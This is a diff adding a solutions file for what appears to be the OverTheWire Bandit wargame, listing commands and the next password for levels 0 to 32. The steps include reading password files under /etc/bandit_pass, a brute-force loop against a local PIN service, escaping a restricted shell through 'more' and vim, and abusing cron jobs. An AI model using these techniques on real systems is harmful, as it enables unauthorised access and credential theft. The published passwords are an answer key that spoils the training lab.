@@ -1,0 +1,192 @@
+Solutions:
+
+Level 0:
+	- Simply 'ls readme' to get password
+	- Next Password: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
+
+Level 1:
+	- cat -- ./-
+	- Next Password: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx
+
+Level 2:
+	- cat './--spaces in this filename--'
+	- Next Password: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
+
+Level 3:
+	- cat ...Hiding-From-You
+	- Next Password: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
+
+Level 4:
+	- cat './-file07'
+	- Next Password: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
+
+Level 5:
+	- find . -type f ! -executable -size 1033c -exec file {} +
+	- cat ./maybehere07/.file2
+	- Next Password: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
+
+Level 6:
+	- find . -size 33c -user bandit7 -group bandit6 2>/dev/null
+	- cat ./var/lib/dpkg/info/bandit7.password
+	- Next Password: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
+
+Level 7:
+	- cat data.txt | grep millionth
+	- Next Password: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
+
+Level 8:
+	- sort data.txt | uniq -u
+	- Next Password: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
+
+Level 9:
+	- strings data.txt | grep -e "==*"
+	- Next Password: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
+
+Level 10:
+	- base64 -d data.txt
+	- Next Password: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
+
+Level 11:
+	- cat data.txt | tr 'N-ZA-Mn-za-m' 'A-Za-z'
+	- Next Password: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
+
+Level 12:
+	- Use xxd to convert the hexdump back
+	- Use file to figure out the compression being used and follow through with decompression
+	- Next Password: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
+
+Level 13:
+	- ssh -i sshkey.private bandit14@bandit -p 2220
+	- cat /etc/bandit_pass/bandit13
+	- Next Password: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
+
+Level 14:
+	- echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
+	- Next Password: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+
+Level 15:
+	- echo "8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo" | openssl s_client -ign_eof localhost:30001
+	- Next Password: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+
+Level 16:
+	- nmap -sV -T4 -p 31000-32000 localhost
+	- echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -ign_eof localhost:31790
+	- Copy the ssh private key to a file and change mod to 400 (root read-only)
+	- ssh -i private.key bandit17@localhost
+	- cat /etc/bandit_pass/bandit17
+	- Next Password: EReVavePLFHtFlFsjn3hyzMlvSuSAcRD
+
+Level 17:
+	- diff passwords.old passwords.new
+	- Next Password: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+
+Level 18:
+	- ssh bandit.labs.overthewire.org -p 2220 -l bandit18 cat readme
+	- Next Password: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+
+Level 19:
+	- ./bandit20-do cat /etc/bandit_pass/bandit20
+	- Next Password: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+
+Level 20:
+	- Open a split window in tmux
+	- In window 1: ./subconnect 9999
+	- In window 2: nc localhost -lv 9999
+	- Type previous password in window2
+	- Next Password: EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+Level 21:
+	- cd /etc/cron.d
+	- cat cronjob_bandit22
+	- cat /usr/bin/cronjob_bandit22.sh
+	- cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+	- Next Password: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+Level 22:
+	- cd /etc/cron.d
+        - cat cronjob_bandit23
+	- cat /usr/bin/cronjob_bandit23.sh
+	- from the script execute the mytarget line on shell but use bandit23 as name
+	- cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+	- Next Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+Level 23:
+	- cd /etc/cron.d
+	- cat cronjob_bandit24
+	- cat /usr/bin/cronjob_bandit24.sh
+	- cd /var/spool/bandit24/foo
+	- make an executable with the line 'cat /etc/bandit_pass/bandit24 > /var/spool/bandit24/foo/pass
+	- wait for a minute and then 'cat pass' 
+	- Next Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+Level 24:
+	- make an executable in /tmp/random_dir$
+	- 
+		#!/bin/bash
+		for i in {0000..9999};
+		do
+			echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i | nc localhost 30002 -N
+		done
+	- ./brute | grep "Correct!" -A 1
+	- Next Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+Level 25:
+	- cat /etc/passwd | grep bandit26
+	- cat /usr/bin/showtext
+	- Make sure that the terminal is very small (to exploit the 'more' command)
+	- ssh -i bandit26.sshkey -p 2220 bandit26@bandit
+	- press 'v' to enter vim mode
+	- In vim type ':e /etc/bandit_pass/bandit26
+	- Next Password: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+
+Level 26:
+	- perform the same 'more' exploit as level 25
+	- press 'v' to enter vim mode
+	- In vim: 
+		:set shell=/bin/bash
+		:shell
+	- Now use the setuid binary to read /etc/bandit_pass/bandit27
+	- Next Password: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+
+Level 27:
+	- git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
+	- cat README
+	- Next Password: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN   
+
+Level 28:
+	- git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
+	- git log --all --graph
+	- git checkout 5ce2fc341ca715d03961781a40988477cc95de7d
+	- cat README.md
+	- Next Password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+
+Level 29:
+	- git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+	- git log --all --graph
+	- git checkout dev
+	- cat README.md
+	- Next Password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
+
+Level 30:
+	- git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
+	- git tag
+	- git show secret
+	- Next Password: fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+
+Level 31:
+	- git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
+	- cat README.md
+	- rm .gitignore
+	- echo "May I come in?" > key.txt
+	- git add .
+	- git commit -m "added key.txt"
+	- git push origin master
+	- Next Password: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
+
+Level 32:
+	- $0
+	- /bin/bash
+	- cat /etc/bandit_pass/bandit33
+	- Next Password: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
+
+COMPLETED!!!
